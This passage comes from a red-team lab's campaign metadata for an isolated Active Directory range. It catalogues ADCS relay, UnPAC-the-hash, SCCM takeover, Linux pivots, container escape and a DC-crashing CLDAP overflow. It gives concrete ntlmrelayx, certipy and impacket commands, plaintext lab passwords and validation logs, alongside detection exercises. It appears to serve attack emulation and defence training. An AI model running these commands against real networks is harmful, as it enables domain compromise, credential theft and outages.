| **Command** | (blocked) `ntlmrelayx.py --smb-port 445 -t http://dc01.cadre.local/certsrv/certfnsh.asp --adcs --template Machine -smb2support` + working SMB coerce (none available) |
| **Script** | `T052-esc8-ws01.sh` |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Execution note (2026-08-01)** | **Root cause (live-tested):** (1) The earlier v5 premise — "Coercer emits `\\<listener>@8445` UNC paths the Windows SMB client resolves" — is FALSE: Windows SMB client ignores `@port` in UNC (tcpdump on relay host captured zero TCP connections to non-445 ports). (2) The only working coerce (MS-RPRN, WT017) makes the victim dial the attacker RPC endpoint (135) with **anonymous** auth ("Empty username ... just waiting") — never an authenticated SMB session to 445. (3) MS-EFSR `\PIPE\efsrpc` blocked, MS-DFSNM/MS-FSRVP/MS-EVEN no dial-out. ws01's kernel-held 445 was a red herring. Surface re-verified live (Spooler on DCs, web enrollment 401, firewall rules, tools staged). Diagnostic scripts: `esc8-v5-chain.ps1` (superseded), `esc8-relay-run.sh`, `esc8-relay-hold.sh`, `b050-find.ps1` (all in `04-automation/linux/windows/`). |

#### UnPAC-the-Hash (WT053)

| Field | Value |
|-------|-------|
| **WT#** | 053 |
| **Status** | ✅ Active |
| **Technique** | After obtaining certificate, use PKINIT to get TGT, then extract NT hash from PAC |
| **Starting credential** | `chief_command` / `C0mm@nd_Ch1ef!` (DA earned via Branch A T015) or Golden Ticket |
| **What it earns** | NT hash of target user |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Command** | `certipy auth -pfx administrator.pfx -dc-ip dc01.cadre.local` |
| **Script** | `T053-unpac-thehash-ws01.sh` |

---

## Branch C: SCCM Escalation (range.local)

| Field | Value |
|-------|-------|
| **Status** | ✅ Active |
| **Stream** | Branch C |
| **Att&ck** | T1213 (Data from Information Repositories), T1071 (Application Layer Protocol), T1078 (Valid Accounts) |
| **Technique** | Abuse SCCM deployment and hierarchy to escalate from site admin to DA in `range.local` |
| **Playbook** | `07-sccm-config.yml` — deploys SCCM site server on mbr02 |
| **Prerequisite** | `svc_sccm` credential or SCCM admin rights |
| **Source machine** | `ws01` |
| **Target machine** | mbr02 (`192.168.77.23`) — SCCM site: CAD |
| **Domain** | `range.local` |
| **Starting credential** | `svc_sccm` / cracked password (from Phase 8 cross-forest Kerberoast) |
| **What it earns** | DA in `range.local` |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Key telemetry** | SCCM site logs; WinSec 4624; Sysmon EID 1/3; Zeek http.log/smb.log |
| **Script** | `T034-sccm-enum-ws01.sh`, `T035-sccm-pxe-boot-ws01.sh`, `T036-sccm-client-push-ws01.sh`, `T037-sccm-cmpivot-ws01.sh`, `T038-sccm-app-deploy-ws01.sh`, `T039-sccm-site-takeover-ws01.sh` |

#### WT034 — NAA Credential Extraction

| Field | Value |
|-------|-------|
| **Technique** | Extract SCCM Network Access Account from WMI on mbr02 |
| **What it earns** | Domain account usable for lateral movement |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Script** | `T034-sccm-enum-ws01.sh` |

#### WT035-039 — SCCM Attack Chain

| WT# | Technique | What it earns |
|-----|-----------|---------------|
| WT035 | PXE Boot abuse | Domain join account / bare-metal control |
| WT036 | Client Push install | Coerce client auth / install agent |
| WT037 | CMPivot | Remote query/exec on managed clients |
| WT038 | Application Deployment | Push malicious app to all clients |
| WT039 | Site Takeover | Full SCCM hierarchy control → DA |

---

## Branch D: Linux Pivot

| Field | Value |
|-------|-------|
| **Status** | ✅ Verified — MSSQL linked-server pivot from `mbr01` to `linux01` works via `impacket-mssqlclient` as `analyst_t1`; 4-part name query `SELECT name FROM LINUX01.master.sys.databases` returned linux01 databases. |
| **Stream** | Branch D |
| **Att&ck** | T1071 (Application Layer Protocol), T1550 (Use Alternate Auth Material), T1059 (Command and Scripting Interpreter) |
| **Technique** | Pivot from Windows compromise to linux01 via MSSQL linked server, SSH, or NFS Kerberos |
| **Playbook** | `07-linux-config.yml` — deploys SSSD, NFS krb5p, Podman on linux01; `08-sql-sccm-wsus-verify.yml` verifies linked server `LINUX01` on `mbr01` |
| **Prerequisite** | Domain credential or Kerberos ticket valid for `linux01` |
| **Source machine** | `ws01` or mbr01/mbr02 |
| **Target machine** | linux01 (`192.168.77.40`) — Ubuntu 24.04 domain-joined |
| **Domain** | `cadre.local` |
| **Starting credential** | `analyst_t1` / `T13r_An@lyst!` (or `svc_mssql` / `s3rv1c3_MSSQL!`) |
| **What it earns** | SQL execution context on linux01; foundation for SSSD ticket / keytab / NFS / Podman escalation |
| **RedStrike Intent** | `sql.mssqlclient` / `sql.xp_cmdshell` |
| **State Output** | SET_STATE(creds.linux01.pivot = "mssql_linked_server") |
| **Key telemetry** | Linux auditd; SSSD logs; Zeek ssh.log / nfs.log; Suricata SID for linux01 traffic |
| **Script** | `T040-mssql-linked-server-hop-ws01.sh`, `T044-linux-sssd-ticket-ws01.sh`, `T045-linux-keytab-ws01.sh`, `T046-linux-mssql-keytab-ws01.sh`, `T047-linux-nfs-ws01.sh`, `T048-linux-podman-escape-ws01.sh` |

#### WT044 — MSSQL Linked Server Recon

| Field | Value |
|-------|-------|
| **WT#** | 044 |
| **Status** | ✅ Verified live |
| **Technique** | Query linked server from mbr01/mbr02 to linux01 MSSQL |
| **Command** | `impacket-mssqlclient child/analyst_t1:'T13r_An@lyst!'@mbr01.child.cadre.local -db master` then `EXECUTE('SELECT name FROM LINUX01.master.sys.databases')` |
| **What it earns** | SQL execution context on linux01; list of databases returned |
| **RedStrike Intent** | `sql.mssqlclient` |
| **State Output** | SET_STATE(creds.linux01.pivot = "mssql_linked_server") |
| **Automation note** | Do **not** use a multi-line `<<EOF` heredoc with `impacket-mssqlclient`; the interpreter treats the terminator as a stored procedure name and loops. Use the `-query` flag (single-line) or a Python `pymssql` wrapper for scripted execution. |

#### WT045 — SSSD Ticket Extraction

| Field | Value |
|-------|-------|
| **Technique** | Extract Kerberos tickets from SSSD cache on linux01 |
| **What it earns** | Domain user TGT/TGS for lateral movement |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Script** | `T044-linux-sssd-ticket-ws01.sh` |

#### WT046 — MSSQL Keytab Extraction

| Field | Value |
|-------|-------|
| **Technique** | Extract keytab used by MSSQL service on linux01 |
| **What it earns** | Service account long-term key |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Script** | `T046-linux-mssql-keytab-ws01.sh` |

#### WT047 — NFS Kerberos Mount

| Field | Value |
|-------|-------|
| **Technique** | Mount NFS export with `sec=krb5p` using valid domain ticket |
| **What it earns** | Access to NFS shares, potential data exfiltration or poison |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Script** | `T047-linux-nfs-ws01.sh` |

#### WT048 — Podman Container Escape

| Field | Value |
|-------|-------|
| **Technique** | Exploit privileged Podman container to escape to host |
| **What it earns** | root on linux01 |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Script** | `T048-linux-podman-escape-ws01.sh` |

---

## G — Pre-Auth DC Exploits (Standalone)

| Field | Value |
|-------|-------|
| **Status** | 🔬 Reference / PoC staged |
| **Stream** | Standalone G (not part of main spine) |
| **Att&ck** | T1210 (Exploitation for Privilege Escalation) |
| **Technique** | Unauthenticated or low-auth exploitation of DC services |
| **Prerequisite** | Target DC vulnerable; snapshot prepared |
| **Source** | Kali or `ws01` |
| **Target** | dc01, dc02, dc03 |
| **What it earns** | SYSTEM/DA on target DC |
| **Key telemetry** | Suricata SID:1000100+; WinSec crash/reboot events; Zeek dce_rpc.log / ldap.log |

#### CVE-2026-41089 — Netlogon CLDAP Stack Buffer Overflow

| Field | Value |
|-------|-------|
| **Status** | 🆕 READY — PoC cloned, not yet executed |
| **CVSS** | 9.8 CRITICAL |
| **Technique** | Single UDP/389 CLDAP packet with oversized `User` field overflows `NlGetLocalPingResponse` → LSASS crash → DC reboot |
| **Prerequisite** | Target DC unpatched (Server 2025 UBR < 32772); UDP/389 reachable |
| **Source** | Kali |
| **Target** | dc02 first (child DC, less critical), then dc01/dc03 |
| **What it earns** | Denial of service; potential code execution (PoC is crash-only) |
| **Command** | `python3 cve-2026-41089/poc.py --target 192.168.77.11` |
| **Cleanup** | `Reset-ComputerMachinePassword` if DC fails to rejoin |
| **Key telemetry** | Suricata SID:1000100 (oversized CLDAP User); WinSec 1000 (LSASS crash); Zeek `cadre-cldap.zeek` |
| **PoC path** | `docs/internal/references/sources/cve-2026-41089/poc.py` |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |

---

## E — Network Defense (14 exercises)

Standalone defensive exercises on the monitor VM (`192.168.77.55`). Not part of the campaign narrative. See `attack-matrix/Campaign/Runbooks/CAMPAIGNS-RUNBOOK-E.md` and `plan1.7-defense-deepening.md`.

| Exercise | Topic | Detection Focus |
|----------|-------|---------------|
| E-01 | Kerberoast detection | Suri SID:1000015, Zeek kerberos.log |
| E-02 | DCSync detection | Suri SID:1000002, Zeek dce_rpc.log |
| E-03 | AS-REP roast detection | Suri SID:1000015, WinSec 4768 |
| E-04 | DGA detection | Suri SID:1000025, ET:2000022 |
| E-05 | DNS TXT exfil | Suri SID:1000026, ET:2000020 |
| E-06 | NXDOMAIN bursts | Suri SID:1000027, ET:2000020 |
| E-07 | TLD anomalies | Suri SID:1000028, ET:2000021 |
| E-08 | IP literal C2 | Suri SID:1000029, ET:200002? |
| E-09 | TLS 1.0 anomalies | Suri SID:1000010, ET:2000031 |
| E-10 | SNI anomalies | ET:2000032 |
| E-11 | C2 cipher suites | Suri/Zeek JA3/JA4 |
| E-12 | SMB admin share | ET:2000012 |
| E-13 | SMBv1 downgrade | ET:2000010 |
| E-14 | HTTP UA anomalies | ET:2000041 |

---

## F — Supply-Chain Simulation (10 scenarios)

Standalone supply-chain attack scenarios on linux01 / mbr01 / npm registry. See `plan1.8-npm-upgrade.md` and `npm-threat-emulation.md`.

| Scenario | Topic | Target |
|----------|-------|--------|
| F-01 | npm registry poisoning | linux01 npm mirror |
| F-02 | Malicious dependency install | ws01 / mbr01 Node.js app |
| F-03 | Typosquat publish | npm registry |
| F-04 | Compromised maintainer | npm package update |
| F-05 | Build script execution | CI/CD on linux01 |
| F-06 | Post-install hook | mbr01 Node.js runtime |
| F-07 | npm token exfil | developer machine |
| F-08 | Package metadata manipulation | registry cache |
| F-09 | Cache poisoning | `.npm/_cacache` |
| F-10 | Tag pollution | `npm dist-tag add` |

---

## Execution Notes

### Identity/Credential Map

| Identity | Domain | Password/Hash | Where Used | How Obtained |
|----------|--------|-------------|------------|--------------|
| `analyst_t1` | `child.cadre.local` | `T13r_An@lyst!` | ws01 beachhead, mbr01 SQL auth, mbr01 WinRM | Assume-breach / H-01..H-06 |
| `intern_blue` | `child.cadre.local` | `1nt3rn_Blu3!` | Phase 1 recon, ACE#18 bridge | AS-REP roast |
| `svc_mssql` | `child.cadre.local` | `s3rv1c3_MSSQL!` | Phase 2 pivot, mbr01 SQL sysadmin | Kerberoast via ACE#18 |
| `analyst_t2` | `child.cadre.local` | reset during Phase 2 | ACE#18 bridge | `intern_blue` ForceChangePassword |
| `analyst_cloud` | `cadre.local` | `Cl0ud_An@lyst!` | mbr01 auto-logon, cross-domain auth | 3.5A Winlogon registry extraction |
| `dc02$` | `child.cadre.local` | TGT | Phase 6 DCSync | Phase 5 coercion + Rubeus monitor |
| `child\krbtgt` | `child.cadre.local` | hash | Phase 7 Golden Ticket | Phase 6 DCSync |
| `root EA` | `cadre.local` | TGT | Phase 8 cross-forest | Phase 7 Golden Ticket + ExtraSids |
| `svc_sccm` | `range.local` | cracked TGS | Branch C SCCM | Phase 8 cross-forest Kerberoast |

### Machine Roles

| Machine | IP | Role | Beachhead? | Notes |
|---------|----|------|------------|-------|
| ws01 | 192.168.77.62 | Windows 11 workstation, initial beachhead | ✅ Primary | `analyst_t1` local admin, all AD tools staged |
| mbr01 | 192.168.77.22 | SQL Server 2022, IIS, CertPotato | ✅ Secondary | SQL → GodPotato → SYSTEM |
| mbr02 | 192.168.77.23 | SCCM site server | Branch C | `svc_sccm` target |
| dc02 | 192.168.77.11 | Child DC child.cadre.local | KDC | AS-REP/Kerberoast/DCSync target |
| dc01 | 192.168.77.10 | Root DC cadre.local + CA | Root KDC | Golden Ticket, ADCS, Branch A target |
| dc03 | 192.168.77.12 | Root DC range.local | Cross-forest | Phase 8 / SCCM target |
| linux01 | 192.168.77.40 | Ubuntu SSSD, NFS, Podman | Branch D | Linux pivot target |
| provisioning | 192.168.77.60 | Kali-like operator box | Operator only | Not a beachhead for campaign simulation |
| elk | 192.168.77.50 | Elastic Stack | Telemetry | Not used for attacks |
| monitor | 192.168.77.55 | Zeek + Suricata | Telemetry | Not used for attacks |
| vr | 192.168.77.51 | Velociraptor + DFIR-Nexus | Telemetry | Not used for attacks |

### Realistic Attack Principles

1. **No direct operator-to-target execution.** Operator uses `ws01` as the beachhead. Commands run from `ws01` as `analyst_t1`.
2. **Right credential on the right machine.** `analyst_t1` is used on `ws01` and `mbr01` (SQL/WinRM). `analyst_cloud` is used on `mbr01` for cross-domain SharpHound/RDP. `svc_mssql` is a Phase 2 pivot identity. `dc02$` TGT is used for DCSync. `krbtgt` is used for Golden Ticket.
3. **Lateral tool transfer over SMB.** Tools are staged on `ws01` in `C:\Tools\ADTools` and copied to `mbr01` via `C$`/`ADMIN$` shares, not downloaded from Kali directly onto mbr01.
4. **No scheduled tasks for attack execution.** Scheduled tasks are persistence only, not a method to run SharpHound or other attack tools.
5. **No provisioning shortcuts.** `provisioning` is for tooling/inventory only; it does not execute campaign commands against lab targets directly.

---

## Validation Update — 2026-08-02 (SCCM Branch C — WS01 now a managed client)

The 2026-07-30 rows above (`T034-039 … "SCCM client not present on ws01"`) are **superseded**. On 2026-08-02 WS01 was completed as a managed SCCM client (ResourceID 16777220, GUID `7ABC7A69-…`, site CAD) and the Branch C chain was exercised **from ws01** as `range\svc_sccm`:

| Attack | Status (2026-08-02) | Evidence |
|--------|--------------------|----------|
| WT034 SCCM NAA extraction | ✅ Verified | Vault bait → `RANGE\svc_naa` (range.local DA) |
| WT035 SCCM PXE Boot | ✅ Surface verified | PXE approved cert `{256B7D4F-…}` + 2 boot images; full exploit needs a real PXE client (not in lab) |
| WT036 SCCM Client Push | ⚠️ Primitive verified | Client-push component enabled + `GenerateCCRByName`/`CreateCCR`; relay needs console-created device |
| WT037 SCCM CMPivot | ✅ **FULL EXEC VERIFIED** | `RunCMPivot` (LogicalDisk) → live WS01 data via AdminService as svc_sccm |
| WT038 SCCM App Deploy | ✅ **FULL EXEC VERIFIED** | App (CI 16777510) + DT (16777511) + assignment (16777217) via AdminService; MP web handlers repaired (`mp.msi` REINSTALL — were empty → `/SMS_MP/.sms_aut` 500) → client policy delivered → payload ran **as SYSTEM** on WS01 (`nt authority\system` + marker) |
| WT039 SCCM Site Takeover | ✅ **FULL EXEC VERIFIED** | Script as `NT AUTHORITY\SYSTEM` on WS01 (`ScriptOutput: "nt authority\\system"` + on-disk markers) |

**Stacked root causes fixed (2026-08-02):** BGB fast channel (empty `SMS_BGB` → `bgbisapi.msi` → TCP 10123), `svc_sccm` Full Admin (DB Takeover-1 grant — was never an RBAC admin), script approval (DB `Scripts` table, `ApprovalState=3`), app model XML (SCCMHunter structure + XML-escaped payload), MP web handlers (`mp.msi` REINSTALL — verified, health 200). Recipes: `docs/sccm-integration-guide.md` Phase 6B (WT037/039) + Phase 6C (WT038 console GUI path) + 6C.4 (MP delivery prerequisite).

---

## Change Log

- **2026-08-02** — WS01 completed as managed SCCM client (ResourceID 16777220). WT037 CMPivot + WT039 script-as-SYSTEM **FULL EXEC VERIFIED** from ws01 as `range\svc_sccm` (live LogicalDisk data; `nt authority\system` + on-disk markers). WT038 app creation + deployment via AdminService working (app 16777510, DT 16777511, assignment 16777217, policy body generated); client delivery root-caused to broken MP web handlers (empty `SMS_MP`/`ServiceData\System` → `/SMS_MP/.sms_aut` 500 → `/ccm_system/request` 0x8000000A) — `mp.msi` REINSTALL repair. Added Phase 6C (WT038 console GUI path) + 6C.4 (MP delivery prerequisite) to `docs/sccm-integration-guide.md`. Superseded the 2026-07-30 "SCCM client not present" rows.

- **2026-07-29** — Created `CAMPAIGNS-METADATA-v2.md` aligned with `CAMPAIGNS_v3.md`. Documented all 8 main-spine phases, Branch 3.5 alternatives, Branches A-D, G section, E/F exercises, identity/credential map, and machine roles. Marked T035/T035A/T004-mbr01 as tested from `ws01`. Marked T102 as in-progress with script created.


---

## Validation Run — 2026-07-30

> ⚠️ **HISTORICAL — state as of 2026-07-30.** The SCCM rows below (`T034-039 … "SCCM client not present on ws01"`) are **superseded** by the 2026-08-02 update further down: WS01 is now a managed SCCM client and WT037/039 are FULL EXEC VERIFIED. Keep this section only as the 07-30 snapshot.

A batch of campaign scripts was executed from `provisioning` (`192.168.77.60`) via NetExec WinRM to `ws01` (`192.168.77.62`).

### Results Summary

| Script | RC | Outcome |
|--------|----|---------|
| T041-xpcmd-ws01.sh | 0 | SQL auth + `xp_cmdshell` as analyst_t1 on mbr01 works (returns `nt service\mssql$sqlexpress`) |
| T042-clr-ws01.sh | 0 | CLR execution path on mbr02 reachable |
| T043-impersonate-ws01.sh | 0 | GodPotato returns `nt authority\system` on mbr01 |
| T043-lpe-alternatives-ws01.sh | 0 | All alternative LPE binaries failed to return SYSTEM on Server 2025 |
| T035-mbr01-creds-ws01.sh | 0 | Mimikatz via GodPotato SYSTEM executed; output pulled |
| T035A-winlogon-creds-ws01.sh | 0 | Plaintext `CADRE\analyst_cloud:Cl0ud_An@lyst!` extracted |
| T101-winrs-pivot-ws01.sh | 0 | WinRS from ws01 to mbr01 as analyst_t1 works |
| T101a-trustedhosts-ws01.sh | 0 | TrustedHosts configured |
| T007-rbcd-ws01.sh | 0 | PowerView LDAP query fails with "An operations error occurred" — blocked |
| T009-dcsync-ws01.sh | 0 | DCSync against cadre.local via chief_command works |
| T010-golden-ws01.sh | 0 | Golden Ticket script executes |
| T011-silver-ws01.sh | 0 | Silver Ticket script executes |
| T012-diamond-ws01.sh | 0 | Diamond Ticket script executes |
| T013-acl-writedacl-ws01.sh | 0 | Script executes |
| T014-acl-genericwrite-ws01.sh | 0 | Script executes |
| T016-acl-genericall-ou-ws01.sh | 0 | Script executes |
| T023-gpo-abuse-ws01.sh | 0 | Script executes |
| T024-gmsa-extraction-ws01.sh | 0 | Script executes |
| T008-shadow-credentials-ws01.sh | 0 | Script executes |
| T050-esc1-ws01.sh | 0 | Certify fails with DirectoryServices error from ws01 |
| T051-esc3-ws01.sh | 0 | Certify fails with DirectoryServices error from ws01 |
| T052-esc8-ws01.sh | 0 | Web enrollment 401 from ws01 |
| T053-unpac-thehash-ws01.sh | 0 | Certify fails with DirectoryServices error from ws01 |
| T034-sccm-enum-ws01.sh | 0 | SCCM client not present on ws01 |
| T035-sccm-pxe-boot-ws01.sh | 0 | SCCM client not present on ws01 |
| T036-sccm-client-push-ws01.sh | 0 | SCCM client not present on ws01 |
| T037-sccm-cmpivot-ws01.sh | 0 | SCCM client not present on ws01 |
| T038-sccm-app-deploy-ws01.sh | 0 | SCCM client not present on ws01 |
| T039-sccm-site-takeover-ws01.sh | 0 | SCCM client not present on ws01 |
| T040-mssql-linked-server-hop-ws01.sh | 0 | Linked-server query to linux01 from mbr01 works |
| T102-coerce-dc02-ws01.sh | 0 | Spooler triggered but 0 Kirbi captured from dc02$ |
| T102-coerce-from-mbr01.sh | 0 | No output file (coercion not producing captured TGT) |

### Blocked Items Requiring Fixes

1. ~~**Phase 5 / T102 coercion**~~ — **RESOLVED 2026-07-31** (dc02 Spooler/RPC prerequisites in `04-vulnerabilities.yml` + verifyOnly; `dc02$` TGT captured via hostname listener).
2. ~~**Phase 5 / WT007 RBCD**~~ — **RESOLVED 2026-07-31** (verified via addcomputer + bloodyAD; the PowerView LDAP quirk is tooling, not connectivity).
3. ~~**Branch B / ADCS ESC1/ESC3/ESC8/UnPAC**~~ — **RESOLVED 2026-08-01** (ESC1/3/UnPAC verified from ws01 with `-dynamic-endpoint` + explicit DC/domain creds; ESC8 deferred as relay-family).
4. **Branch C / WT035-039 SCCM chain** — ~~Requires running from a SCCM client/site system (e.g., mbr02) or with SCCM PowerShell module; not exercisable from ws01.~~ **SUPERSEDED 2026-08-02** — WS01 is now a managed SCCM client (ResourceID 16777220); WT037 CMPivot + WT038 app deploy + WT039 script-as-SYSTEM **FULL EXEC VERIFIED** from ws01 as `range\svc_sccm`.
5. **Branch D / WT045-048** — Linux pivot scripts do not exist; manual execution required.
6. **Branch 3.5 / 3.5G, 3.5H, 3.5J, 3.5K, 3.5L, 3.5M** — Not exercised in this run.
7. **Phase 0.5 / H-01..H-06** — Intentionally excluded per user request (barring initial access).